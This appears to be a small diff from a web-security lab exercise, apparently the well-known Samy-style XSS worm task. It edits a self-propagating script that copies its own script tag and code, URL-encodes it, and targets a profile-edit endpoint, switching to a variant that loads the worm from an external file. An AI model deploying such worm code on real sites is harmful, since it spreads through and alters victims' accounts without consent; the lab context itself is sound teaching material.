@@ -13,7 +13,8 @@ window.onload = function() {
     var samyGuid = 59; //FILL IN
     var sendurl = "/action/profile/edit"; //FILL IN
 
-    var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; // (1)
+    // file variant: add src to script tag
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\" src=\"http://localhost/task6.js\">"; // (1)
     var jsCode = document.getElementById("worm").innerHTML; // (2)
     var tailTag = "</" + "script>"; // (3)
     var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); // (4)
